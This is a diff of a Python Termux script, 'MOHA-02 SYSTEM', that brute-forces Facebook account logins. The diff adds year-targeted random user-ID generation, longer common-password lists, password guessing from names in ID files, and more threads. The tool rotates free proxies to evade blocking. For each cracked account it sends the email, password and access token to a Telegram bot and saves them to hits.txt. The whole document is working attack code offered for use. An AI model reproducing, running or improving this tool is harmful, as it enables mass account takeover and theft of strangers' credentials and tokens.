@@ -2,7 +2,7 @@
 # --------------------------------------------------------
 # Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
 # Developer: Moha Al-Shalfawi (@m_oha_02)
-# Version: 3.0 (2026)
+# Version: 3.5 (2026) - Multi-Year Hunting
 # --------------------------------------------------------
 
 import os, sys, time, requests, random, uuid, threading, json
@@ -27,8 +27,9 @@ proxy_list = []
 # --- 📢 Auto Join Channel Function ---
 def join_channel():
     print(f"{X}[*] Joining Official Channel...")
-    time.sleep(2)
+    # محاولة فتح القناة تلقائياً في تيرمكس
     os.system("termux-open-url https://t.me/m_oha0_2b")
+    time.sleep(2)
 
 def logo():
     os.system('clear')
@@ -38,7 +39,7 @@ def logo():
 {X}  | |\/| | |  | | |_| | / _ \  | | | |__) |
 {X}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
 {F}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
-{F}       SYSTEM V3.0 - BY MOHA AL-SHALFAWI
+{F}       SYSTEM V3.5 - BY MOHA AL-SHALFAWI
 {X}--------------------------------------------------
 {W}  [+] Developer : @m_oha_02
 {W}  [+] Channel   : t.me/m_oha0_2b
@@ -49,6 +50,7 @@ def fetch_proxies():
     global proxy_list
     print(f"{C}[*] Fetching new proxies to avoid blocking...")
     try:
+        # جلب بروكسيات مجانية متجددة
         res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
         proxy_list = res.splitlines()
         print(f"{F}[+] Successfully loaded {len(proxy_list)} proxies.")
@@ -73,32 +75,61 @@ def login_fb(email, pw, chat_id=None, bot_token=None):
         res = requests.post(url, data=data, headers={"User-Agent": ua}, proxies=proxy, timeout=10).json()
         if "session_key" in res:
             hits += 1
-            print(f"\r{F}[HIT] {email} | {pw}                    ")
+            print(f"\r{F}[MOHA-HIT] {email} | {pw}                    ")
             if bot_token and chat_id:
                 msg = f"🔥 MOHA HIT!\nEmail: {email}\nPass: {pw}\nToken: {res.get('access_token')}"
                 requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}")
+            with open("hits.txt", "a") as f: f.write(f"{email}:{pw}\n")
         elif "www.facebook.com" in str(res):
             cp += 1
-            print(f"\r{X}[CP] {email} | {pw}                     ")
+            print(f"\r{X}[MOHA-CP] {email} | {pw}                     ")
+            with open("cp.txt", "a") as f: f.write(f"{email}:{pw}\n")
         else:
             bad += 1
             sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {email[:15]}..."); sys.stdout.flush()
     except: pass
 
-# --- 🚀 Tool 1: Random Old Account Cracking ---
+# --- 🚀 Tool 1: Multi-Year Account Cracking ---
 def tool_old_accounts():
     logo()
+    print(f"{C}--- Select Year To Target ---")
+    print(f"{B}[1] Rare Accounts (2004-2005) - Short IDs")
+    print(f"{B}[2] Old Accounts (2009) - 1000000 Series")
+    print(f"{B}[3] Mid Accounts (2010-2012) - 100001 Series")
+    print(f"{B}[4] Accounts (2013-2014) - 100005 Series")
+    print(f"{Z}[0] Back to Main Menu")
+    
+    year_choice = input(f"\n{X}MOHA-YEAR > ")
+    if year_choice == '0': return
+
     token = input(f"{C}[+] Enter Bot Token: ")
-    id = input(f"{C}[+] Enter Chat ID: ")
-    passwords = ['19901990', '19801980', '123456', '123123', '112233']
+    chat_id = input(f"{C}[+] Enter Chat ID: ")
     fetch_proxies()
     
-    print(f"{F}[*] Attack started on old accounts...")
-    with ThreadPoolExecutor(max_workers=30) as pool:
+    # قائمة كلمات السر المطلوبة بدقة
+    passwords = [
+        '123456', '1234567', '12345678', '123456789', 
+        '123123', '321321', 'password', 'password123', 
+        'Iloveyou', 'facebook', 'google', 'hello123',
+        '19901990', '20002000'
+    ]
+    
+    print(f"{F}[*] Attack started on selected year...")
+    with ThreadPoolExecutor(max_workers=35) as pool:
         while True:
-            uid = "1000" + str(random.randint(100000000, 999999999))
+            # توليد الآيديات حسب السنة المختارة
+            if year_choice == '1':
+                uid = str(random.randint(100000, 99000000))
+            elif year_choice == '2':
+                uid = "1000000" + str(random.randint(10000, 99999))
+            elif year_choice == '3':
+                uid = "100001" + str(random.randint(100000, 999999))
+            elif year_choice == '4':
+                uid = "100005" + str(random.randint(100000, 999999))
+            else: break
+
             for pw in passwords:
-                pool.submit(login_fb, uid, pw, id, token)
+                pool.submit(login_fb, uid, pw, chat_id, token)
 
 # --- 🚀 Tool 2: ID Extractor ---
 def tool_extract_ids():
@@ -118,37 +149,41 @@ def tool_extract_ids():
         print(f"{Z}[!] Extraction failed. Check your cookie.")
         time.sleep(2)
 
-# --- 🚀 Tool 3: File Checker ---
+# --- 🚀 Tool 3: File Checker (Targeted Attack) ---
 def tool_file_checker():
     logo()
     file_path = input(f"{C}[+] Enter ID file path (e.g., id.txt): ")
     token = input(f"{C}[+] Enter Bot Token: ")
-    id = input(f"{C}[+] Enter Chat ID: ")
+    chat_id = input(f"{C}[+] Enter Chat ID: ")
     
-    passwords = ['123456', '12345678', '11223344', 'first123']
+    passwords = [
+        '123456', '1234567', '12345678', '123456789', 
+        '123123', '321321', 'password', 'first123', 'first1234'
+    ]
     fetch_proxies()
     
     try:
         users = open(file_path, "r").read().splitlines()
         print(f"{F}[*] Loaded {len(users)} accounts. Starting check...")
-        with ThreadPoolExecutor(max_workers=30) as pool:
+        with ThreadPoolExecutor(max_workers=35) as pool:
             for line in users:
-                user = line.split('|')[0]
+                user = line.split('|')[0] if '|' in line else line
                 for pw in passwords:
-                    cpw = pw.replace("first", line.split('|')[1].split(' ')[0]) if '|' in line else pw
-                    pool.submit(login_fb, user, cpw, id, token)
+                    # ميزة تخمين كلمة السر من الاسم
+                    final_pw = pw.replace("first", line.split('|')[1].split(' ')[0]) if 'first' in pw and '|' in line else pw
+                    pool.submit(login_fb, user, final_pw, chat_id, token)
     except:
         print(f"{Z}[!] File not found!")
         time.sleep(2)
 
 # --- Main Menu ---
 def main():
-    join_channel() # استدعاء القناة عند البداية
+    join_channel()
     while True:
         logo()
-        print(f"{B}[1] Crack Old Accounts (Random + Common Pass)")
+        print(f"{B}[1] Crack Old Accounts (Select Year 2004-2014)")
         print(f"{B}[2] Extract IDs (From Friends List)")
-        print(f"{B}[3] File Checker (Targeted Attack)")
+        print(f"{B}[3] File Checker (Check Active IDs from File)")
         print(f"{Z}[0] Exit Tool")
         
         choice = input(f"\n{X}MOHA-02 > ")
